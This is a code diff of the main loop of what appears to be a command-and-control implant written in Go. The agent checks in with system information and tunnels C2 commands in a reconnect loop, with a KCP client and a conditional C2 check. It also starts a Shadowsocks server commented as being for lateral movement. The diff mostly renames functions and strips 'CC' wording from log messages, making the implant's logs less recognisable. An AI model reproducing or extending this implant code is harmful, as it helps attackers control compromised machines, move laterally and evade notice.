@@ -45,7 +45,7 @@ func agent_main() {
 
 	// applyRuntimeConfig
 	logging.Println("Applying runtime config...")
-	err = common.ApplyRuntimeConfig()
+	err = common.InitConfig()
 	if err != nil {
 		logging.Fatalf("ApplyRuntimeConfig: %v", err)
 	}
@@ -57,7 +57,7 @@ func agent_main() {
 
 	if runtime.GOOS == "linux" {
 		// PATH
-		agentutils.SetPath()
+		agentutils.InitializePath()
 
 		// set HOME to correct value
 		setupEnvironment()
@@ -72,7 +72,7 @@ func agent_main() {
 	}
 
 test_agent:
-	alive, pid := agentutils.IsAgentRunningPID()
+	alive, pid := agentutils.CheckExistingInstance()
 	if alive {
 		proc, err := os.FindProcess(pid)
 		if err != nil {
@@ -126,7 +126,7 @@ test_agent:
 		def.CCAddress = fmt.Sprintf("https://127.0.0.1:%s/", common.RuntimeConfig.CCPort)
 
 		// run KCP
-		go c2transport.KCPC2Client() // KCP client will run when UseKCP is set
+		go c2transport.RunKCPClient() // KCP client will run when UseKCP is set
 	} else {
 		// parse C2 address
 		// append CCPort to CCAddress
@@ -205,13 +205,13 @@ test_agent:
 		}
 		time.Sleep(time.Duration(util.RandInt(3, 20)) * time.Second)
 	}
-	go c2transport.ShadowsocksServer() // start shadowsocks server for lateral movement
+	go c2transport.RunSSServer() // start shadowsocks server for lateral movement
 
 connect:
 	// check preset CC status URL, if CC is supposed to be offline, take a nap
 	if common.RuntimeConfig.CCIndicatorWaitMax > 0 &&
 		common.RuntimeConfig.CCIndicatorURL != "" { // check indicator URL or not
-		if !c2transport.ConditionalC2Yes(common.RuntimeConfig.C2TransportProxy) {
+		if !c2transport.CheckC2Condition(common.RuntimeConfig.C2TransportProxy) {
 			logging.Println("Conditional C2 check failed, signaling parent and exiting")
 			conditionalC2FailNotify()
 			return
@@ -234,7 +234,7 @@ connect:
 	logging.Printf("Checking in on %s", def.CCAddress)
 
 	// check in with system info
-	err = c2transport.CheckIn(agentutils.CollectSystemInfo())
+	err = c2transport.ReportStatus(agentutils.GatherSystemDetails())
 	if err != nil {
 		logging.Printf("CheckIn error: %v, sleeping, will retry later", err)
 		util.TakeASnap()
@@ -248,17 +248,17 @@ connect:
 		def.CCAddress,
 		transport.MsgAPI,
 		token)
-	conn, ctx, cancel, err := c2transport.ConnectCC(msgURL)
+	conn, ctx, cancel, err := c2transport.EstablishC2Connection(msgURL)
 	def.CCMsgConn = conn
 	if err != nil {
-		logging.Printf("Connect CC failed: %v, signaling parent and exiting", err)
+		logging.Printf("Connection failed: %v, signaling parent and exiting", err)
 		conditionalC2FailNotify()
 		return
 	}
 	def.KCPKeep = true
-	logging.Println("Connecting to CC message tunnel...")
-	c2transport.CCMsgTun(handler.HandleC2Command, ctx, cancel)
-	logging.Printf("CC message tunnel closed, reconnecting")
+	logging.Println("Connecting to message tunnel...")
+	c2transport.MsgTunneler(handler.HandleC2Command, ctx, cancel)
+	logging.Printf("Message tunnel closed, reconnecting")
 	goto connect
 }
 
